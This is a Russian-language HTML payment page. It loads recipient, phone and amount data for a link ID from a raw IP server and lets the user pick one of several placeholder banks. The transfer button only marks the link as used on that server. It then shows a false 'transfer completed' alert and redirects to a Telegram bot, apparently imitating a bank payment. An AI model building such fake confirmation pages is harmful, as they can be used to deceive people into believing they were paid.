<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Выбор банка</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background-color: #f5f5f7;
            color: #1d1d1f;
            padding: 20px;
            max-width: 500px;
            margin: 0 auto;
        }

        /* Общие стили для заголовков */
       .screen-header {
            display: flex;
            justify-content: space-between; /* Равномерное распределение */
            align-items: center;
            margin-bottom: 24px;
        }

        .screen-title {
            font-size: 22px;
            font-weight: 600;
            position: absolute;
            left: 0;
            right: 0;
            text-align: center;
            margin: auto;
            pointer-events: none; /* Чтобы клики проходили сквозь */
        }
        .back-arrow {
            font-size: 24px;
            margin-right: 15px;
            cursor: pointer;
            color: #3366ff;
        }

        /* Стили для экрана выбора банка */
        #bank-selection-screen {
            display: block;
        }
        .search-box {
            background: white;
            border-radius: 10px;
            padding: 12px 16px;
            margin-bottom: 16px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        .search-input {
            width: 100%;
            border: none;
            outline: none;
            font-size: 16px;
        }
        .bank-list {
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        .bank-item {
            display: flex;
            align-items: center;
            padding: 16px;
            border-bottom: 1px solid #f0f0f0;
            cursor: pointer;
            transition: background 0.2s;
        }
        .bank-item:hover {
            background: #f9f9f9;
        }
        .bank-logo {
            width: 32px;
            height: 32px;
            border-radius: 6px;
            margin-right: 12px;
            object-fit: contain;
        }
        .bank-name {
            font-size: 16px;
            flex-grow: 1;
        }

        /* Стили для экранов оплаты */
        .payment-screen {
            display: none;
            background: white;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }
        .payment-header {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 20px;
            text-align: center;
        }
        .recipient-info {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #eee;
        }
        .amount {
            font-size: 24px;
            font-weight: 600;
            margin: 20px 0;
            text-align: center;
        }
        .message {
            color: #666;
            margin-bottom: 25px;
            padding: 10px;
            background: #f9f9f9;
            border-radius: 8px;
        }
        .transfer-btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            transition: background 0.2s;
        }
        .transfer-btn:hover {
            opacity: 0.9;
        }

        /* Цветовые схемы для разных банков */
        .sbp-screen {
            border-top: 4px solid #886747;
        }
        .sbp-header {
            color: #886747;
        }
        .sbp-btn {
            background: #886747;
        }

        .blue-screen {
            border-top: 4px solid #0066CC;
        }
        .blue-header {
            color: #0066CC;
        }
        .blue-btn {
            background: #0066CC;
        }

        .red-screen {
            border-top: 4px solid #CC0000;
        }
        .red-header {
            color: #CC0000;
        }
        .red-btn {
            background: #CC0000;
        }

        .green-screen {
            border-top: 4px solid #00AA00;
        }
        .green-header {
            color: #00AA00;
        }
        .green-btn {
            background: #00AA00;
        }

        .yellow-screen {
            border-top: 4px solid #FFCC00;
        }
        .yellow-header {
            color: #FF9900;
        }
        .yellow-btn {
            background: #FF9900;
        }
    </style>
</head>
<body>
    <!-- Экран выбора банка -->
    <div id="bank-selection-screen">
        <div class="screen-header">
            <div class="screen-title">Выберите способ оплаты</div>
        </div>

        <div class="search-box">
            <input type="text" class="search-input" placeholder="Найти банк">
        </div>

        <div class="bank-list">
            <!-- СБПэй -->
            <div class="bank-item" onclick="showPaymentScreen('sbp')">
                <img src="СБП.png" class="bank-logo" alt="СБПэй">
                <div class="bank-name">СБПэй</div>
            </div>

            <!-- Синий Банк -->
            <div class="bank-item" onclick="showPaymentScreen('blue')">
                <img src="blue.png" class="bank-logo" alt="Синий Банк">
                <div class="bank-name">Синий Банк</div>
            </div>

            <!-- Красный Банк -->
            <div class="bank-item" onclick="showPaymentScreen('red')">
                <img src="red.png" class="bank-logo" alt="Красный Банк">
                <div class="bank-name">Красный Банк</div>
            </div>

            <!-- Зеленый Банк -->
            <div class="bank-item" onclick="showPaymentScreen('green')">
                <img src="green.png" class="bank-logo" alt="Зеленый Банк">
                <div class="bank-name">Зеленый Банк</div>
            </div>

            <!-- Желтый Банк -->
            <div class="bank-item" onclick="showPaymentScreen('yellow')">
                <img src="yellow.png" class="bank-logo" alt="Желтый Банк">
                <div class="bank-name">Желтый Банк</div>
            </div>
        </div>
    </div>

    <!-- Экран оплаты СБПэй -->
     <div id="sbp-screen" class="payment-screen sbp-screen">
        <div class="screen-header">
            <div class="back-arrow" onclick="showBankSelection()">←</div>
            <div class="screen-title sbp-header">Приложение СБПэй</div>
        </div>
        <div class="recipient-info">
            <span id="recipient-name">Загрузка...</span>
            <span id="recipient-pam">Загрузка...</span>
        </div>
        <div class="amount" id="payment-amount">Загрузка...</div>
        <div class="message" id="payment-message">Загрузка...</div>
        <button class="transfer-btn sbp-btn" onclick="makeTransfer('sbp')">Перевести</button>
    </div>

    <!-- Экран оплаты Синий Банк -->
    <div id="blue-screen" class="payment-screen blue-screen">
        <div class="screen-header">
            <div class="back-arrow" onclick="showBankSelection()">←</div>
            <div class="screen-title blue-header">Синий Банк</div>
        </div>
        <div class="recipient-info">
            <span id="recipient-name">Загрузка...</span>
            <span id="recipient-pam">Загрузка...</span>
        </div>
        <div class="amount" id="payment-amount">Загрузка...</div>
        <div class="message" id="payment-message">Загрузка...</div>
        <button class="transfer-btn blue-btn" onclick="makeTransfer('синий')">Перевести</button>
    </div>

    <!-- Экран оплаты Красный Банк -->
    <div id="red-screen" class="payment-screen red-screen">
        <div class="screen-header">
            <div class="back-arrow" onclick="showBankSelection()">←</div>
            <div class="screen-title red-header">Красный Банк</div>
        </div>
        <div class="recipient-info">
            <span id="recipient-name">Загрузка...</span>
            <span id="recipient-pam">Загрузка...</span>
        </div>
        <div class="amount" id="payment-amount">Загрузка...</div>
        <div class="message" id="payment-message">Загрузка...</div>
        <button class="transfer-btn red-btn" onclick="makeTransfer('красный')">Перевести</button>
    </div>

    <!-- Экран оплаты Зеленый Банк -->
    <div id="green-screen" class="payment-screen green-screen">
        <div class="screen-header">
            <div class="back-arrow" onclick="showBankSelection()">←</div>
            <div class="screen-title green-header">Зеленый Банк</div>
        </div>
        <div class="recipient-info">
            <span id="recipient-name">Загрузка...</span>
            <span id="recipient-pam">Загрузка...</span>
        </div>
        <div class="amount" id="payment-amount">Загрузка...</div>
        <div class="message" id="payment-message">Загрузка...</div>
        <button class="transfer-btn green-btn" onclick="makeTransfer('зеленый')">Перевести</button>
    </div>

    <!-- Экран оплаты Желтый Банк -->
    <div id="yellow-screen" class="payment-screen yellow-screen">
        <div class="screen-header">
            <div class="back-arrow" onclick="showBankSelection()">←</div>
            <div class="screen-title yellow-header">Желтый Банк</div>
        </div>
        <div class="recipient-info">
            <span id="recipient-name">Загрузка...</span>
            <span id="recipient-pam">Загрузка...</span>
        </div>
        <div class="amount" id="payment-amount">Загрузка...</div>
        <div class="message" id="payment-message">Загрузка...</div>
        <button class="transfer-btn yellow-btn" onclick="makeTransfer('желтый')">Перевести</button>
    </div>

<script>
    // Показываем экран оплаты выбранного банка
    function showPaymentScreen(bank) {
        // Скрываем экран выбора банка
        document.getElementById('bank-selection-screen').style.display = 'none';

        // Показываем выбранный экран оплаты
        document.getElementById(`${bank}-screen`).style.display = 'block';
    }

    // Возвращаемся к выбору банка
    function showBankSelection() {
        // Скрываем все экраны оплаты
        document.querySelectorAll('.payment-screen').forEach(el => {
            el.style.display = 'none';
        });

        // Показываем экран выбора банка
        document.getElementById('bank-selection-screen').style.display = 'block';
    }

async function makeTransfer(bank) {
    try {
        const urlParams = new URLSearchParams(window.location.search);
        const linkId = urlParams.get('id');

        if (!linkId) {
            throw new Error('ID ссылки не найден');
        }

        // 1. Выполняем фоновый запрос для обновления статуса (если нужно)
        await fetch(`http://193.33.153.154:8000/update_link_status/${linkId}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        });

 // 2. Выводим в консоль информацию о переводе
        const bankName = bank === 'sbp' ? 'СБПэй' : bank + ' банк';
        console.log(`[ПЕРЕВОД УСПЕШЕН] Способ оплаты: ${bankName}, ID ссылки: ${linkId}, Время: ${new Date().toLocaleString()}`);

        // 2. Показываем пользователю сообщение об успехе
        alert(`Перевод через ${bank === 'sbp' ? 'СБПэй' : bank + ' банк'} выполнен!`);

        // 3. Перенаправляем пользователя
        window.location.href = 'https://t.me/Link2paybot';

    } catch (error) {
        console.error("Ошибка:", error);
        alert(`Ошибка: ${error.message}`);
    }
}

    // Функция для отображения сообщения о использованной ссылке
    function showLinkUsedMessage() {
        // Скрываем все элементы на странице
        document.body.innerHTML = `
            <div style="text-align: center; padding: 40px 20px;">
                <h2 style="margin-bottom: 20px; color: #cc0000;">Эта платежная ссылка уже была использована</h2>
                <p style="margin-bottom: 30px; color: #666;">Вы не можете совершить платеж по этой ссылке повторно.</p>
                <button onclick="window.location.href = 'https://t.me/Link2paybot'"
                        style="padding: 12px 24px; background: #3366ff; color: white;
                               border: none; border-radius: 8px; font-size: 16px;
                               cursor: pointer;">
                    Закрыть
                </button>
            </div>
        `;
    }

    // Функция для загрузки данных платежа
    async function loadPaymentData() {
        const urlParams = new URLSearchParams(window.location.search);
        const linkId = urlParams.get('id');

        if (!linkId) {
            console.error("ID ссылки не указан");
            return;
        }

        try {
            const response = await fetch(`http://193.33.153.154:8000/get_link_data/${linkId}`);
            if (!response.ok) {
                throw new Error('Ошибка загрузки данных');
            }

            const data = await response.json();

            // Проверяем статус ссылки
            if (data.status === true) {
                showLinkUsedMessage();
                return;
            }

            // Заполняем данные на всех экранах
            document.querySelectorAll('.recipient-info span:nth-child(1)').forEach(el => {
                el.textContent = `Получатель: ${data.pam}`;
            });

            document.querySelectorAll('.recipient-info span:nth-child(2)').forEach(el => {
                el.textContent = `Телефон: ${data.phone_number}`;
            });

            document.querySelectorAll('.amount').forEach(el => {
                el.textContent = `${data.amount} ₽`;
            });

            document.querySelectorAll('.message').forEach(el => {
                el.textContent = `Сообщение: ${data.pay_message || 'Без сообщения'}`;
            });

        } catch (error) {
            console.error("Ошибка:", error);
            // Можно добавить отображение ошибки пользователю
            document.body.innerHTML = `
                <div style="text-align: center; padding: 40px 20px;">
                    <h2 style="margin-bottom: 20px; color: #cc0000;">Ошибка загрузки данных</h2>
                    <p style="margin-bottom: 30px; color: #666;">Не удалось загрузить данные платежа. Пожалуйста, попробуйте позже.</p>
                    <button onclick="window.location.href = 'https://t.me/Link2paybot'"
                            style="padding: 12px 24px; background: #3366ff; color: white;
                                   border: none; border-radius: 8px; font-size: 16px;
                                   cursor: pointer;">
                        Закрыть
                    </button>
                </div>
            `;
        }
    }

    // Вызываем при загрузке страницы
    document.addEventListener('DOMContentLoaded', () => {
        loadPaymentData();

        // Если есть ID в URL, сразу показываем экран выбора банка
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('id')) {
            showBankSelection();
        }
    });
</script>

</body>
</html>
